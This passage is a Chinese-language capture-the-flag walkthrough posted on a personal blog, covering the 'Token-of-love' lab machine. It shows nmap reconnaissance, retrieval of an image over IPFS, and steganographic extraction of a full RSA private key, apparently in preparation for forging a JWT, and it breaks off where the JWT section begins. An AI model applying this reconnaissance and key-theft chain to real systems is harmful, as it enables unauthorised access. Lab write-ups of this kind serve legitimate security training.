@@ -1,0 +1,797 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Miao">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="靶机说明 https:&#x2F;&#x2F;thehackerslabs.com&#x2F;token-of-love&#x2F;  一、信息收集1、主机探测123456789101112131415┌──(kali㉿kali)-[~&#x2F;miao&#x2F;thl&#x2F;token-of-love]└─$ sudo nmap -sn 192.168.2.0&#x2F;24               Starting Nmap 7.94SVN ( https:&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Token-of-love">
+<meta property="og:url" content="http://miao-sec.github.io/thehackerslabs/Token-of-love/index.html">
+<meta property="og:site_name" content="Miao&#39;s Blog">
+<meta property="og:description" content="靶机说明 https:&#x2F;&#x2F;thehackerslabs.com&#x2F;token-of-love&#x2F;  一、信息收集1、主机探测123456789101112131415┌──(kali㉿kali)-[~&#x2F;miao&#x2F;thl&#x2F;token-of-love]└─$ sudo nmap -sn 192.168.2.0&#x2F;24               Starting Nmap 7.94SVN ( https:&#x2F;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/31.jpg">
+<meta property="article:published_time" content="2025-08-21T13:48:48.000Z">
+<meta property="article:modified_time" content="2025-08-21T13:50:04.162Z">
+<meta property="article:author" content="Miao">
+<meta property="article:tag" content="IPFS">
+<meta property="article:tag" content="JWT">
+<meta property="article:tag" content="提权-tee">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/31.jpg">
+  
+  
+  
+  <title>Token-of-love - Miao&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/glassBg.css">
+<link rel="stylesheet" href="/css/macBorder.css">
+<link rel="stylesheet" href="/css/scrollAnimation.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"miao-sec.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"|","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"W5UPQ7BHtxFTBIoh5xr1UWMt-gzGzoHsz","app_key":"WEHCtPWZ5dJRfC1hhVipHKwQ","server_url":"https://w5upq7bh.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body><!-- hexo injector body_begin start --><div id="web_bg"></div><!-- hexo injector body_begin end -->
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav
+  id="navbar"
+  class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar"
+>
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title"
+        >Miaosec</strong
+      >
+    </a>
+
+    <button
+      id="navbar-toggler-btn"
+      class="navbar-toggler"
+      type="button"
+      data-toggle="collapse"
+      data-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent"
+      aria-expanded="false"
+      aria-label="Toggle navigation"
+    >
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+            
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/"
+            target="_self"
+          >
+            <i class="iconfont icon-home-fill"></i>
+            <span>首页</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/archives/"
+            target="_self"
+          >
+            <i class="iconfont icon-archive-fill"></i>
+            <span>归档</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/categories/"
+            target="_self"
+          >
+            <i class="iconfont icon-category-fill"></i>
+            <span>分类</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/tags/"
+            target="_self"
+          >
+            <i class="iconfont icon-tags-fill"></i>
+            <span>标签</span>
+          </a>
+        </li>
+             
+        <li class="nav-item">
+          <a
+            class="nav-link"
+            href="/links/"
+            target="_self"
+          >
+            <i class="iconfont icon-link-fill"></i>
+            <span>友链</span>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="search-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            data-toggle="modal"
+            data-target="#modalSearch"
+            aria-label="Search"
+          >
+            <i class="iconfont icon-search"></i>
+          </a>
+        </li>
+          
+        <li class="nav-item" id="color-toggle-btn">
+          <a
+            class="nav-link"
+            target="_self"
+            href="javascript:;"
+            aria-label="Color Toggle"
+          >
+            <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+          </a>
+        </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Token-of-love"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-08-21 21:48" pubdate>
+          2025年8月21日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          11 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Token-of-love</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://thehackerslabs.com/token-of-love/">https://thehackerslabs.com/token-of-love/</a></li>
+</ul>
+<h1 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h1><h2 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.2.0/24               <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 09:46 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00018s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00026s latency).<br>MAC Address: 08:00:27:0B:D1:2B (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.20<br>Host is up (0.0012s latency).<br>MAC Address: 08:00:27:70:85:D5 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 28.09 seconds<br></code></pre></td></tr></table></figure>
+<p>靶机IP：<code>192.168.2.20</code></p>
+<h2 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h2><h3 id="1-全端口扫描"><a href="#1-全端口扫描" class="headerlink" title="1.全端口扫描"></a>1.全端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --min-rate 10000 -p- 192.168.2.20<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 09:48 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.20<br>Host is up (0.017s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:70:85:D5 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 15.77 seconds<br></code></pre></td></tr></table></figure>
+<p>开放端口：<code>22,80</code></p>
+<h3 id="2-详细信息扫描"><a href="#2-详细信息扫描" class="headerlink" title="2.详细信息扫描"></a>2.详细信息扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p22,80 192.168.2.20 <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 09:50 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.20<br>Host is up (0.00069s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>MAC Address: 08:00:27:70:85:D5 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 21.30 seconds<br></code></pre></td></tr></table></figure>
+<ol>
+<li><strong>22端口：ssh服务</strong>，版本为<code>OpenSSH 9.2p1</code></li>
+<li><strong>80端口：http服务</strong>，版本为<code>Apache httpd 2.4.62</code></li>
+</ol>
+<h3 id="3-漏洞脚本扫描"><a href="#3-漏洞脚本扫描" class="headerlink" title="3.漏洞脚本扫描"></a>3.漏洞脚本扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80 192.168.2.20           <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-18 09:51 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.20<br>Host is up (0.00076s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.2.20</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.2.20:80/</span><br><span class="hljs-string">|     Form id: username</span><br><span class="hljs-string">|     Form action: /</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.2.20:80/register</span><br><span class="hljs-string">|     Form id: username</span><br><span class="hljs-string">|_    Form action: /register</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-enum: <br>|_  /register/: Potentially interesting folder<br>MAC Address: 08:00:27:70:85:D5 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 64.30 seconds<br></code></pre></td></tr></table></figure>
+<p>找到http服务存在目录<code>/register</code></p>
+<h1 id="二、漏洞渗透"><a href="#二、漏洞渗透" class="headerlink" title="二、漏洞渗透"></a>二、漏洞渗透</h1><h2 id="1、WEB-80端口渗透"><a href="#1、WEB-80端口渗透" class="headerlink" title="1、WEB-80端口渗透"></a>1、WEB-80端口渗透</h2><p>访问页面，是一个登录框<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502180959815.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<p>根据找到的<code>/register</code>目录，进行注册登录，成功进入页面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181001482.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload><br>页面提示信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">**administrador** (2025/2/18 10:00:29): Bienvenido. En Token Of Love, la pasión por la ciberseguridad se une al amor digital.<br>欢迎光临。在《爱的信物》中，对网络安全的热情与数字爱情相遇。<br><br>**administrador** (2025/2/18 10:00:29): Dicen que las claves viajan por rutas interplanetarias, vagando por el espacio infinito y estando en todas partes a la vez… ¿será magia o pura tecnología? 😉🔮 bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu<br>据说钥匙沿着星际路线旅行，在无限的空间中漫游，同时出现在任何地方……这是魔法还是纯粹的技术？ 😉🔮bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu<br></code></pre></td></tr></table></figure>
+
+<p>查看页面源码，找到相关的提示<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181004404.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Busca el conejo hacker amoroso en un mundo interplanetario !<br>在星际世界中寻找可爱的黑客兔子！<br>Solo los usuarios admin pueden enviar mensajes<br>只有管理员用户可以发送消息<br></code></pre></td></tr></table></figure>
+
+<h3 id="1-IPFS渗透"><a href="#1-IPFS渗透" class="headerlink" title="1.IPFS渗透"></a>1.IPFS渗透</h3><p>根据上面的提示查找到IPFS，下载安装一个IPFS工具，导入上面的钥匙<code>bafybeicbqiitqxhqx47qenneilgb2ckdpweoxxkdmcnx4pda654l733lxu</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502181033528.png" srcset="https://miaorj.oss-cn-chengdu.aliyuncs.com/img/loading.gif" lazyload></p>
+<p>进行下载后，查看文件，发现是一个webp文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ file miao      <br>miao: RIFF (little-endian) data, Web/P image<br></code></pre></td></tr></table></figure>
+
+<p>使用webp文件的图像隐写术工具<code>imgconceal</code>进行检查<br><a target="_blank" rel="noopener" href="https://github.com/tbpaolini/imgconceal">https://github.com/tbpaolini/imgconceal</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">mv</span> miao miao.webp                                    <br><br>┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ ./imgconceal --check=miao.webp                                  <br>Input password <span class="hljs-keyword">for</span> the hidden file (may be blank)<br>Password: <br>Scanning cover image <span class="hljs-keyword">for</span> suitable carrier bits... Done!  <br>Found file <span class="hljs-string">&#x27;private.key&#x27;</span>:<br>  hidden on:     Fri Feb 14 01:49:04 2025<br>  last access:   Fri Feb 14 01:40:31 2025<br>  last modified: Thu Feb 13 08:38:30 2025<br>  size: 1.70 KB<br><br>The cover image <span class="hljs-string">&#x27;miao.webp&#x27;</span> can hide approximately more 391.77 KB (after compression of hidden data).<br></code></pre></td></tr></table></figure>
+<p>发现里面隐藏着文件<code>private.key</code></p>
+<p>提取隐藏文件<code>private.key</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> ./imgconceal --extract=miao.webp --no-password --output=private<br>Scanning cover image <span class="hljs-keyword">for</span> suitable carrier bits... Done!  <br>SUCCESS: extracted <span class="hljs-string">&#x27;private.key&#x27;</span> from <span class="hljs-string">&#x27;miao.webp&#x27;</span>.<br>  hidden on: Fri Feb 14 01:49:04 2025<br></code></pre></td></tr></table></figure>
+
+<p>成功找到私钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cat</span> private/private.key<br>-----BEGIN PRIVATE KEY-----<br>MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQCq9/ZGu21YSX7c<br>nJ2E0v2w6adGuMhApMmBSe4DLKGpRAXQZtwy2UslqRZUt1vbefmvBboC9f11cfMb<br>gWaPturLwYQo/qLf8bNnMQww63MXsFAUmcgf24LSEi+faFr776IR/1+U8U76oSOW<br>buouGahGGWt74Pwdv/xXmqbZUNxXZOdrxDgixhV/UipWkxnex4GRphFe4KBcT/0i<br>1qAdgxpgDQbjVj5g+mmceOpSnc1gbsrtsEjgbWSvDEAWplNlRlAiUF0np6PqgpUL<br>OuxRTMHlj4Gdb7YfHp8Mz6KTgKE1+ko4vusvKq+9UqcgyUHW8VCmWvhFZ6iedRJ0<br>Ayzm+P1XAgMBAAECggEASm8HMTdDfUcOLNUgvSWw3ndzZNZpFL/JnPjHX2lsfomH<br>cHp/zsGMtno9pydnHhAmNN1s5QIc1aeFHIoDUXllEs2PENv/pDkSDtCrSpcPdhZE<br>XxuupbQHahcR1bh0uC/VozlH70v5wyMpn8JtQSHZgZ9qjLXgfcFKhwdlMcLDE2a7<br>2S5xac3OCQSD6Dak0pwTcnjUiQb43H6sR9d6DY6eMBTrCH+nJdHh3vOathhIzlj7<br>uDPYc5o5E6Ui6JJmrRt5H4FSAIzati3qw3+eE9hRbYqNJtYnQcxWXSY2HbLX8ooh<br>LUcAGm23+RSy7cBfdIQUSjWROqk6oE9XZaP6JE3YaQKBgQDegPsKL+6jBH16LKo3<br>vSm1vVh0aq87yv2zhTPNMctM30hOKzQqfNOt4yJQ5j86hEqMr1iHrgXOMRmxZAHt<br>Y330s50nva2aV2DekY6KZHk2prUfwMYp+UjAGL5ehRJ3goI5eD+Eo8+NIwk4hecM<br>kxnaBktuXjvhHaI5VZOTxr57GQKBgQDEtODMSu3OsqtDmQVyMjBiR5W1l8dp9vn3<br>jRo2uRc2EEKh2rOQxFJy4UYcg8O5Ekp0irD8jr7GGrHgTF+9o3u0k37h8AOZdR94<br>Yj5UGo3hkYzcSyAmg+5IauLNATXKAkMsF1VwRDLp34PWL3BDcS63LF6f+iSl9vYR<br>FVNlWoe57wKBgDxqYz/R4gcrmfKJnDKET4YEgrchnLEsnhSXr4gg5CXcXuKywnhi<br>6otFqDS1QCfgcemfVveIXhUtqd9L22Yc5L+D4cE/tJq67ReiCEU1oOAhBf84NdaB<br>1KosTcyWb3w52KhIKV8Xp6yX/dH2MdVtP9C+cs7mEXY/uKO+w9KVXXVJAoGAfMSC<br>BfLM7htz+Dd6NdnRyLTBJ+Ky0Oqf2L4+T1GNgHRF32XaGcv8w/NRxkppfd01LsC9<br>zCQ6q2tJQg0PeTjWAU7A30ye69pXcMNX537EWbw5jY11QhjSrkplu0S2OoC+3Juc<br>TM5lQOTOOa/zVEPZLsRM7Mn8Luz7XRCayiHnDy8CgYBsSiu45tsvRRKmMNY4Gxb5<br>6s2rgGPKbDxmXc4s5xqAqNi6MmFxcZQGkmw8Unzd1QB9HeFGlJGuqIeIj5kRLepL<br>4mKP3UvXUZGHWIl4MNSoqPh8u1Sq2P4W/K+NOlKTXnmrvldF+VxYaRTdqQ46+h3k<br>PkDtOtToiExm8jdJZ5lNdw==<br>-----END PRIVATE KEY-----<br></code></pre></td></tr></table></figure>
+
+<p>从私钥中提权公钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> openssl rsa -<span class="hljs-keyword">in</span> private/private.key -pubout  -out pkcs1.pub<br>writing RSA key<br></code></pre></td></tr></table></figure>
+
+<p>查看公钥</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/thl/token-of-love]<br>└─$ <span class="hljs-built_in">sudo</span> <span class="hljs-built_in">cat</span> pkcs1.pub                                              <br>-----BEGIN PUBLIC KEY-----<br>MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqvf2RrttWEl+3JydhNL9<br>sOmnRrjIQKTJgUnuAyyhqUQF0GbcMtlLJakWVLdb23n5rwW6AvX9dXHzG4Fmj7bq<br>y8GEKP6i3/GzZzEMMOtzF7BQFJnIH9uC0hIvn2ha+++iEf9flPFO+qEjlm7qLhmo<br>Rhlre+D8Hb/8V5qm2VDcV2Tna8Q4IsYVf1IqVpMZ3seBkaYRXuCgXE/9ItagHYMa<br>YA0G41Y+YPppnHjqUp3NYG7K7bBI4G1krwxAFqZTZUZQIlBdJ6ej6oKVCzrsUUzB<br>5Y+BnW+2Hx6fDM+ik4ChNfpKOL7rLyqvvVKnIMlB1vFQplr4RWeonnUSdAMs5vj9<br>VwIDAQAB<br>-----END PUBLIC KEY-----<br></code></pre></td></tr></table></figure>
+<h3 id="2-逻辑漏洞-JWT"><a href="#2-逻辑漏洞-JWT" class="headerlink" title="2.逻辑漏洞-JWT"></a>2.逻辑漏洞-JWT</h3><p>查看登录时所发生的数据包，找到cookie的token，发现是<code>jwt加密</code></p>
